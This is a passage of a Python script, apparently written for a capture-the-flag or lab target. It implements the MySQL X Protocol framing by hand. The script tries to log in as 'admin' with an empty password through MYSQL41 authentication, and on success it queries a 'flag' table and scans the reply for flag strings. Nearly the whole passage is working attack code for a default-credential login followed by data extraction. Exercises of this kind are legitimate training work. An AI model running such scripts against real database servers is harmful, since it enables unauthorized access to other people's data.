        elif wire == 5:
            if pos + 4 > len(data):
                raise ValueError("truncated fixed32 field")
            value, pos = data[pos:pos + 4], pos + 4
        else:
            raise ValueError("unsupported protobuf wire type %d" % wire)
        fields.append({"number": number, "wire": wire, "value": value})
    return fields

def printable_strings(data):
    found = []
    for match in re.finditer(rb"[\x20-\x7e]{3,}", data):
        found.append(match.group(0).decode("ascii", "replace"))
    return found

def recv_exact(sock, count):
    chunks = []
    remaining = count
    while remaining:
        part = sock.recv(remaining)
        if not part:
            raise EOFError("peer closed connection while reading a frame")
        chunks.append(part)
        remaining -= len(part)
    return b"".join(chunks)

def recv_frame(sock):
    header = recv_exact(sock, 4)
    length = struct.unpack("<I", header)[0]
    if length < 1 or length > MAX_FRAME:
        raise ValueError("invalid MySQL X frame length %d" % length)
    body = recv_exact(sock, length)
    return body[0], body[1:]

def send_frame(sock, message_type, payload=b""):
    body = bytes([message_type]) + payload
    sock.sendall(struct.pack("<I", len(body)) + body)

def event(message_type, payload):
    result = {"type": message_type, "payload_hex": payload[:512].hex(),
              "payload_truncated": len(payload) > 512}
    try:
        result["protobuf_fields"] = [
            {"number": f["number"], "wire": f["wire"],
             "value": (f["value"].hex() if isinstance(f["value"], bytes)
                       else f["value"])}
            for f in protobuf_fields(payload)
        ]
    except Exception as exc:
        result["protobuf_parse_error"] = str(exc)
    strings = printable_strings(payload)
    if strings:
        result["printable_strings"] = strings[:40]
    return result

def receive_until(sock, wanted, events, max_messages=12):
    for _ in range(max_messages):
        sock.settimeout(TIMEOUT)
        mtype, payload = recv_frame(sock)
        events.append({"direction": "server_to_client", **event(mtype, payload)})
        if mtype in wanted:
            return mtype, payload
        if mtype == 1:
            return mtype, payload
    raise RuntimeError("message limit reached before expected protocol response")

def main():
    result = {
        "target": "%s:%d" % (HOST, PORT),
        "protocol_basis": "Nmap fingerprint identified MySQL X details and advertised MYSQL41 and SHA256_MEMORY",
        "authentication_attempt": {"username": "admin", "method": "MYSQL41", "password_test": "empty password only"},
        "events": [],
        "authenticated": False,
        "flag_observed": False,
        "limitations": []
    }
    sock = None
    try:
        sock = socket.create_connection((HOST, PORT), timeout=TIMEOUT)
        sock.settimeout(0.6)
        # The observed endpoint emits a Notice-shaped packet even before a
        # capability response. Record it if present; do not mistake it for an error.
        try:
            mtype, payload = recv_frame(sock)
            result["events"].append({"direction": "server_to_client", "phase": "initial", **event(mtype, payload)})
        except socket.timeout:
            pass
        sock.settimeout(TIMEOUT)
        send_frame(sock, 1, b"")  # Mysqlx.Connection.CapabilitiesGet
        result["events"].append({"direction": "client_to_server", "type": 1, "payload_hex": ""})
        cap_type, cap_payload = receive_until(sock, {2}, result["events"])
        if cap_type == 1:
            result["capabilities_error"] = event(cap_type, cap_payload)
            result["limitations"].append("server returned an Error instead of Capabilities")
            return result
        result["capabilities_received"] = True

        # Begin the evidence-supported MYSQL41 exchange. Only an empty password
        # is tested; no credential guessing or additional password attempts occur.
        start_payload = pb_string(1, "MYSQL41") + pb_bytes(3, b"admin")
        send_frame(sock, 4, start_payload)  # AuthenticateStart
        result["events"].append({"direction": "client_to_server", "type": 4,
                                 "payload_hex": start_payload.hex(),
                                 "note": "MYSQL41 admin start; initial response contains username only"})
        auth_type, auth_payload = receive_until(sock, {3, 4, 1}, result["events"])
        if auth_type == 3:
            # MYSQL41 has supplied its continuation challenge. For an empty
            # password, the protocol response is empty; send exactly one response.
            continuation = pb_bytes(1, b"")
            send_frame(sock, 5, continuation)  # AuthenticateContinue
            result["events"].append({"direction": "client_to_server", "type": 5,
                                     "payload_hex": continuation.hex(),
                                     "note": "empty-password MYSQL41 continuation"})
            auth_type, auth_payload = receive_until(sock, {3, 4, 1}, result["events"])
        if auth_type == 4:
            result["authenticated"] = True
            result["authentication_result"] = "server sent AuthenticateOk"
            # Query only after an authenticated context is established.
            query = b"SELECT * FROM flag"
            stmt_payload = pb_bytes(1, query) + pb_string(3, "sql")
            send_frame(sock, 12, stmt_payload)  # StmtExecute
            result["events"].append({"direction": "client_to_server", "type": 12,
                                     "sql": query.decode("ascii"), "namespace": "sql"})
            query_events = []
            try:
                for _ in range(40):
                    sock.settimeout(TIMEOUT)
                    qtype, qpayload = recv_frame(sock)
                    qe = {"direction": "server_to_client", "phase": "flag_query", **event(qtype, qpayload)}
                    query_events.append(qe)
                    if re.search(rb"(?i)(?:flag|ctf)\{[^\r\n}]{1,500}\}", qpayload):
                        result["flag_observed"] = True
                    if qtype in (1, 17):  # Error or StmtExecuteOk
                        break
                result["events"].extend(query_events)
                if not any(e.get("type") in (1, 17) for e in query_events):
                    result["limitations"].append("flag query response did not reach Error or StmtExecuteOk")
            except (socket.timeout, EOFError, OSError) as exc:
                result["limitations"].append("flag query response incomplete: %s" % exc)
            if not result["flag_observed"]:
                result["limitations"].append("no recognizable flag text was observed in the flag-table query response")
        elif auth_type == 1:
            result["authentication_result"] = "server returned an Error; admin empty-password authentication was not verified"
            result["authentication_error"] = event(auth_type, auth_payload)
        else:
            result["authentication_result"] = "authentication remains incomplete; server requested another continuation"
            result["limitations"].append("additional authentication exchange was not attempted")
    except Exception as exc:
        result["error"] = "%s: %s" % (type(exc).__name__, exc)
        result["limitations"].append("protocol interaction did not establish authentication or flag visibility")
    finally:
        if sock is not None:
            try:
                sock.close()
            except OSError:
                pass
    return result

if __name__ == "__main__":
    print(json.dumps(main(), sort_keys=True))

